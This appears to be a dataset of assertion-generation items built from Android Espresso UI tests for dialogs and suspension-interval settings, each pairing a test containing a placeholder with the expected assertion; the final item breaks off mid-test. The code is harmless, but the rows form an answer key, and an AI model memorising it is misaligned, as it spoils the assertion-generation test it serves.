getContextOptionsSupport() { Log.d(ContextOptionsDialog.class.getName(), ""getContextOptionsSupport""); List<Fragment> fragments = getParentFragmentManager().getFragments(); for (Fragment fragment : fragments) { if (fragment instanceof ContextOptionsSupport) { return (ContextOptionsSupport) fragment; } } Log.d(ContextOptionsDialog.class.getName(), ""getContextOptionsSupport, no parent fragment implementing "" + ContextOptionsSupport.class.getSimpleName()); Activity activity = getActivity(); if (activity == null) { Log.e(ContextOptionsDialog.class.getName(), ""getContextOptionsSupport, activity is null""); return null; } if (!(activity instanceof ContextOptionsSupport)) { Log.e(ContextOptionsDialog.class.getName(), ""getContextOptionsSupport, activity is not an instance of "" + ContextOptionsSupport.class.getSimpleName()); return null; } return (ContextOptionsSupport) activity; }"	assertFalse(testContextOptionsSupport.wasOnContextOptionsDialogEntryClickedCalled())
"testErrorMessage() { GeneralErrorDialog errorDialog = openGeneralErrorDialog(); onView(isRoot()).perform(waitFor(500)); ""<AssertPlaceHolder>""; onView(withId(R.id.textview_dialog_general_error_message)).check(matches(withText(""Message""))); onView(withId(R.id.imageview_dialog_general_error_ok)).perform(click()); }
getExtraData() { return BundleUtil.stringFromBundle(getExtraDataKey(), requireArguments()); }"	"assertEquals(""ExtraData"", errorDialog.getExtraData())"
"testGetValue() { SettingsInput input = new SettingsInput(SettingsInput.Type.ADDRESS, ""abc"", ""field"", Collections.emptyList()); SettingsInputDialog inputDialog = openSettingsInputDialog(input); onView(isRoot()).perform(waitFor(500)); onView(withId(R.id.imageview_dialog_settings_input_ok)).perform(click()); ""<AssertPlaceHolder>""; }
getValue() { return StringUtil.notNull(valueEditText.getText()); }"	"assertEquals(""abc"", inputDialog.getValue())"
"testStateSavedOnScreenRotation() { SettingsInput input = new SettingsInput(SettingsInput.Type.ADDRESS, ""abc"", ""field"", Collections.emptyList()); openSettingsInputDialog(input); onView(isRoot()).perform(waitFor(500)); onView(withId(R.id.edittext_dialog_settings_input_value)).check(matches(withText(""abc""))); rotateScreen(activityScenario); onView(withId(R.id.edittext_dialog_settings_input_value)).check(matches(withText(""abc""))); onView(withId(R.id.edittext_dialog_settings_input_value)).perform(replaceText(""test"")); rotateScreen(activityScenario); onView(withId(R.id.edittext_dialog_settings_input_value)).check(matches(withText(""test""))); SettingsInputDialog inputDialog = (SettingsInputDialog) getActivity(activityScenario).getSupportFragmentManager().getFragments().get(0); onView(withId(R.id.imageview_dialog_settings_input_ok)).perform(click()); ""<AssertPlaceHolder>""; }
getValue() { return StringUtil.notNull(valueEditText.getText()); }"	"assertEquals(""test"", inputDialog.getValue())"
"testNoIntervals() { activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.textview_activity_global_settings_suspension_enabled_label)).check(matches(withText(""Suspension intervals enabled""))); onView(withId(R.id.switch_activity_global_settings_suspension_enabled)).check(matches(isChecked())); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(1))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""No intervals defined""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); activityScenario.close(); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(0, getDialog().getAdapter().getAllItems().size())
"testIntervalDefaultValues() { activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(1))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""No intervals defined""))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(22))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(4))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(5))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(7))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(8))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(10))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(13))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(14))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(16))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(5))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 05:00 End: 07:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 08:00 End: 10:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 11:00 End: 13:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(withText(""Start: 14:00 End: 16:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 4))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 4))).check(matches(withText(""Start: 22:00 End: 04:00""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(5, getDialog().getAdapter().getAllItems().size())
"testIntervalDefaultValuesNoIntervalsModified() { activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(1))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""No intervals defined""))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(22))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(23)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(5))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 23:00 End: 05:00""))); onView(allOf(withId(R.id.imageview_list_item_suspension_interval_delete), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).perform(click()); onView(withId(R.id.imageview_dialog_confirm_ok)).perform(click()); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(22))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(5)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 05:00 End: 11:00""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(1, getDialog().getAdapter().getAllItems().size())
"testIntervalDefaultValuesNoIntervalsModifiedScreenRotation() { activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(1))); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval_no_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""No intervals defined""))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(22))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(23)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(5))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 23:00 End: 05:00""))); onView(allOf(withId(R.id.imageview_list_item_suspension_interval_delete), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).perform(click()); onView(withId(R.id.imageview_dialog_confirm_ok)).perform(click()); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(22))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).perform(setNumber(5)); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).perform(setNumber(0)); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(11))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(0))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 05:00 End: 11:00""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(1, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesLargestGap() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.textview_activity_global_settings_suspension_enabled_label)).check(matches(withText(""Suspension intervals enabled""))); onView(withId(R.id.switch_activity_global_settings_suspension_enabled)).check(matches(isChecked())); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(12))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(12))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(14))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(12))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(4))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 12:12 End: 14:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(4, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesLargestGapScreenRotation() { getIntervalDAO().insertInterval(getInterval1()); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(getInterval3()); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.textview_activity_global_settings_suspension_enabled_label)).check(matches(withText(""Suspension intervals enabled""))); onView(withId(R.id.switch_activity_global_settings_suspension_enabled)).check(matches(isChecked())); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(12))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(12))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(14))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(12))); rotateScreen(activityScenario); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(4))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 10:11 End: 11:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 12:12 End: 14:12""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(withText(""Start: 22:15 End: 23:59""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(4, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesThresholdGap() { Interval interval1 = getInterval1(); Time start1 = new Time(); start1.setHour(3); start1.setMinute(32); Time end1 = new Time(); end1.setHour(21); end1.setMinute(0); interval1.setStart(start1); interval1.setEnd(end1); Interval interval3 = getInterval3(); Time end3 = new Time(); end3.setHour(0); end3.setMinute(30); interval3.setEnd(end3); getIntervalDAO().insertInterval(interval1); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(interval3); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.textview_activity_global_settings_suspension_enabled_label)).check(matches(withText(""Suspension intervals enabled""))); onView(withId(R.id.switch_activity_global_settings_suspension_enabled)).check(matches(isChecked())); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(2))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(32))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(3))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(2))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(4))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(withText(""Start: 01:01 End: 02:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 1))).check(matches(withText(""Start: 02:32 End: 03:02""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 2))).check(matches(withText(""Start: 03:32 End: 21:00""))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 3))).check(matches(withText(""Start: 22:15 End: 00:30""))); ""<AssertPlaceHolder>""; onView(withId(R.id.imageview_dialog_suspension_intervals_cancel)).perform(click()); }
getAdapter() { return (SuspensionIntervalAdapter) getSuspensionIntervalsRecyclerView().getAdapter(); }"	assertEquals(4, getDialog().getAdapter().getAllItems().size())
"testIntervalsDefaultValuesThresholdGapScreenRotation() { Interval interval1 = getInterval1(); Time start1 = new Time(); start1.setHour(3); start1.setMinute(32); Time end1 = new Time(); end1.setHour(21); end1.setMinute(0); interval1.setStart(start1); interval1.setEnd(end1); Interval interval3 = getInterval3(); Time end3 = new Time(); end3.setHour(0); end3.setMinute(30); interval3.setEnd(end3); getIntervalDAO().insertInterval(interval1); getIntervalDAO().insertInterval(getInterval2()); getIntervalDAO().insertInterval(interval3); getTimeBasedSuspensionScheduler().restart(); activityScenario = launchSettingsInputActivity(GlobalSettingsActivity.class); injectTimeBasedSuspensionScheduler(); onView(withId(R.id.textview_activity_global_settings_suspension_enabled_label)).check(matches(withText(""Suspension intervals enabled""))); onView(withId(R.id.switch_activity_global_settings_suspension_enabled)).check(matches(isChecked())); onView(withId(R.id.cardview_activity_global_settings_suspension_intervals)).perform(click()); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(3))); onView(withId(R.id.imageview_dialog_suspension_intervals_interval_add)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""Start""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(2))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(32))); rotateScreen(activityScenario); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); onView(withId(R.id.textview_dialog_suspension_interval_select_time_label)).check(matches(withText(""End""))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_hour)).check(matches(withValue(3))); onView(withId(R.id.picker_dialog_suspension_interval_select_time_minute)).check(matches(withValue(2))); onView(withId(R.id.imageview_dialog_suspension_interval_select_ok)).perform(click()); rotateScreen(activityScenario); onView(withId(R.id.listview_dialog_suspension_intervals_intervals)).check(matches(withListSize(4))); onView(allOf(withId(R.id.cardview_list_item_suspension_interval), withChildDescendantAtPosition(withId(R.id.listview_dialog_suspension_intervals_intervals), 0))).check(matches(isDisplayed())); onView(allOf(withId(R.id.textview_list_item_suspension_interval), 